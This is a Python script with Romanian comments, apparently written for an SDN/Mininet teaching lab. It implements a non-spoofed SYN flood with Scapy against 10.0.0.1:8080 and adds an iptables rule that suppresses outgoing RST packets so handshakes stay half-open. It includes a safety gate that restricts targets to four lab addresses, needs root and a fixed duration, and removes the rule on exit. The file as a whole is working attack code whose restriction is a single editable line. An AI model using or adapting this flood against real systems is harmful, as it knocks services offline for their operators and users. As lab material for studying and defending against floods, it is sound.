#!/usr/bin/env python3
"""
syn_flood.py - SYN flood direct (non-spoofed), scris in Scapy.

  * o singura sursa controlata: h3 (10.0.0.3), adresa REALA (fara spoofing);
  * destinatie FIXA: 10.0.0.1:8080;
  * portul TCP SURSA variaza la fiecare cerere;
  * fiecare SYN e un handshake nou, niciodata finalizat.

Rulare (din CLI-ul Mininet, deci in namespace-ul h3):
    mininet> h3 python3 attacks/syn_flood.py --rate 500 --duration 60
"""
from __future__ import annotations

import argparse
import os
import random
import signal
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lab_config import load_lab

from scapy.all import IP, TCP, conf  # noqa: E402

ALLOWED_LAB_IPS = {"10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"}

_stop = False


def _handle_sigint(signum, frame):
    global _stop
    _stop = True


def get_local_ips():
    try:
        out = subprocess.check_output(["ip", "-4", "-o", "addr"], text=True)
        return {line.split()[3].split("/")[0] for line in out.splitlines()}
    except Exception:
        return set()


def safety_gate(dst_ip: str, expected_src: str):
    """Porti de siguranta: refuza rularea in afara laboratorului."""
    if os.geteuid() != 0:
        sys.exit("[EROARE] Ruleaza ca root (Scapy are nevoie de socket raw).")
    local_ips = get_local_ips()
    if expected_src not in local_ips:
        sys.exit(f"[EROARE] IP-ul {expected_src} (h3) nu este local. "
                 f"IP-uri gasite: {sorted(local_ips)}. "
                 f"Ruleaza scriptul in namespace-ul h3 (mininet> h3 python3 ...).")
    if dst_ip not in ALLOWED_LAB_IPS:
        sys.exit(f"[EROARE] Tinta {dst_ip} nu apartine laboratorului {ALLOWED_LAB_IPS}.")


def rst_rule(action: str, dst_ip: str, dport: int):
    """Adauga (-A) sau scoate (-D) regula care blocheaza RST-urile catre serviciu.
    NU contine --sport: portul sursa variaza, destinatia ramane fixa."""
    cmd = ["iptables", action, "OUTPUT", "-p", "tcp", "-d", dst_ip,
           "--dport", str(dport), "--tcp-flags", "RST", "RST", "-j", "DROP"]
    try:
        subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        print(f"[avertisment] Nu am putut {action} regula iptables RST: {e}")
        return False


def main():
    lab = load_lab()
    ap = argparse.ArgumentParser(description="SYN flood non-spoofed (laborator SDN)")
    ap.add_argument("--dst", default=lab.syn.get("server_ip", "10.0.0.1"))
    ap.add_argument("--dport", type=int, default=lab.syn.get("server_port", 8080))
    ap.add_argument("--src", default=lab.role("attacker").ip,
                    help="IP-ul real al atacatorului (h3)")
    ap.add_argument("--rate", type=float, default=500.0,
                    help="rata tinta de SYN/s (best-effort)")
    ap.add_argument("--duration", type=float, required=True,
                    help="durata maxima in secunde (OBLIGATORIU)")
    ap.add_argument("--sport-min", type=int, default=20000)
    ap.add_argument("--sport-max", type=int, default=60000)
    ap.add_argument("--no-suppress-rst", action="store_true",
                    help="nu adauga regula iptables de suprimare RST")
    args = ap.parse_args()

    safety_gate(args.dst, args.src)
    signal.signal(signal.SIGINT, _handle_sigint)
    conf.verb = 0

    rst_added = False
    if not args.no_suppress_rst:
        rst_added = rst_rule("-A", args.dst, args.dport)
        if rst_added:
            print(f"[ok] Suprimare RST activata (h3 -> {args.dst}:{args.dport}).")

    print(f"[atac] SYN flood {args.src} -> {args.dst}:{args.dport} | "
          f"rata tinta {args.rate:.0f} SYN/s | durata max {args.duration:.0f}s")
    print("[atac] Ctrl+C pentru oprire controlata.\n")

    tx = conf.L3socket()
    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    sent = 0
    t0 = time.monotonic()
    next_report = t0 + 1.0
    try:
        while not _stop and (time.monotonic() - t0) < args.duration:
            sport = random.randint(args.sport_min, args.sport_max)
            pkt = IP(src=args.src, dst=args.dst) / TCP(
                sport=sport, dport=args.dport, flags="S",
                seq=random.randint(0, 2**32 - 1))
            tx.send(pkt)
            sent += 1
            if interval:
                time.sleep(interval)
            now = time.monotonic()
            if now >= next_report:
                eff = sent / (now - t0)
                print(f"  [+] trimise={sent}  rata efectiva={eff:.0f} SYN/s")
                next_report = now + 1.0
    finally:
        elapsed = time.monotonic() - t0
        eff = sent / elapsed if elapsed > 0 else 0.0
        print(f"\n[atac] Oprit. SYN trimise={sent}  durata={elapsed:.1f}s  "
              f"rata efectiva={eff:.0f} SYN/s")
        if rst_added:
            rst_rule("-D", args.dst, args.dport)
            print("[ok] Regula iptables de suprimare RST scoasa.")


if __name__ == "__main__":
    main()